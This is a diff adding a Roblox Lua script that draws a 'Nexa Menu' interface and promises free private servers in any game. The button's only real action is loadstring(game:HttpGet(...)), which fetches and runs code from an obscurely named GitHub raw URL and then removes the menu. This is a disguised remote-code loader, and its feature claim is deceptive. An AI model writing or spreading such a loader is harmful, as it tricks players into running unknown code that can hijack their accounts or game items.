@@ -1,0 +1,120 @@
+--// GUI SIMPLE (1 BUTTON + TOGGLE)
+local TweenService = game:GetService("TweenService")
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Hapus GUI lama kalau ada
+if playerGui:FindFirstChild("NexaGui") then
+	playerGui.NexaGui:Destroy()
+end
+
+-- Buat GUI utama
+local gui = Instance.new("ScreenGui")
+gui.Name = "NexaGui"
+gui.Parent = playerGui
+gui.ResetOnSpawn = false
+
+--// TOGGLE BUTTON (tengah atas)
+local toggleBtn = Instance.new("TextButton", gui)
+toggleBtn.Size = UDim2.new(0,140,0,28)
+toggleBtn.Position = UDim2.new(0.5,0,0,-30)
+toggleBtn.AnchorPoint = Vector2.new(0.5,0)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(25,25,25)
+toggleBtn.BorderColor3 = Color3.fromRGB(60,60,60)
+toggleBtn.Text = "Open GUI"
+toggleBtn.Font = Enum.Font.Code
+toggleBtn.TextSize = 14
+toggleBtn.TextColor3 = Color3.fromRGB(255,255,255)
+Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0,6)
+
+--// FRAME UTAMA
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0,520,0,230)
+frame.Position = UDim2.new(0.5,0,0.5,0)
+frame.AnchorPoint = Vector2.new(0.5,0.5)
+frame.BackgroundColor3 = Color3.fromRGB(17,17,17)
+frame.BorderColor3 = Color3.fromRGB(40,40,40)
+frame.BorderSizePixel = 1
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0,6)
+
+-- Header
+local header = Instance.new("TextLabel", frame)
+header.Size = UDim2.new(1,-20,0,35)
+header.Position = UDim2.new(0,10,0,5)
+header.BackgroundTransparency = 1
+header.Font = Enum.Font.Code
+header.TextSize = 20
+header.TextColor3 = Color3.fromRGB(255,130,0)
+header.TextXAlignment = Enum.TextXAlignment.Left
+header.Text = "Nexa Menu"
+
+-- Garis
+local line = Instance.new("Frame", frame)
+line.Size = UDim2.new(1,-20,0,1)
+line.Position = UDim2.new(0,10,0,40)
+line.BackgroundColor3 = Color3.fromRGB(40,40,40)
+
+-- Panel kiri
+local leftPanel = Instance.new("Frame", frame)
+leftPanel.Size = UDim2.new(0.4,-10,1,-60)
+leftPanel.Position = UDim2.new(0,10,0,50)
+leftPanel.BackgroundTransparency = 1
+
+local label = Instance.new("TextLabel", leftPanel)
+label.Size = UDim2.new(1,0,0,20)
+label.BackgroundTransparency = 1
+label.Font = Enum.Font.Code
+label.TextSize = 15
+label.TextColor3 = Color3.fromRGB(255,255,255)
+label.TextXAlignment = Enum.TextXAlignment.Left
+label.Text = "Action:"
+
+-- Tombol utama
+local useBtn = Instance.new("TextButton", leftPanel)
+useBtn.Size = UDim2.new(1,0,0,35)
+useBtn.Position = UDim2.new(0,0,0,30)
+useBtn.BackgroundColor3 = Color3.fromRGB(26,26,26)
+useBtn.BorderColor3 = Color3.fromRGB(50,50,50)
+useBtn.Font = Enum.Font.Code
+useBtn.TextColor3 = Color3.fromRGB(255,255,255)
+useBtn.TextSize = 14
+useBtn.Text = "Generate Privat Server"
+Instance.new("UICorner", useBtn).CornerRadius = UDim.new(0,4)
+
+-- Panel kanan
+local rightPanel = Instance.new("Frame", frame)
+rightPanel.Size = UDim2.new(0.55,-10,1,-60)
+rightPanel.Position = UDim2.new(0.45,10,0,50)
+rightPanel.BackgroundTransparency = 1
+
+local info1 = Instance.new("TextLabel", rightPanel)
+info1.Size = UDim2.new(1,0,0,50)
+info1.BackgroundTransparency = 1
+info1.Font = Enum.Font.Code
+info1.TextSize = 14
+info1.TextColor3 = Color3.fromRGB(255,130,0)
+info1.TextXAlignment = Enum.TextXAlignment.Left
+info1.TextWrapped = true
+info1.Text = "✦ Click to create a private server for free and it works on all games. Maybe some of them don't work."
+
+--// LOGIC: Use Script
+useBtn.MouseButton1Click:Connect(function()
+	useBtn.Text = "Loading..."
+	useBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
+	pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/fefeferscefewPRIVAT"))()
+	end)
+	task.wait(1)
+	gui:Destroy()
+end)
+
+--// LOGIC: Toggle buka/tutup
+local isOpen = true
+toggleBtn.MouseButton1Click:Connect(function()
+	isOpen = not isOpen
+	if isOpen then
+		TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {Position = UDim2.new(0.5,0,0.5,0)}):Play()
+	else
+		TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {Position = UDim2.new(0.5,0,1.5,0)}):Play()
+	end
+end)
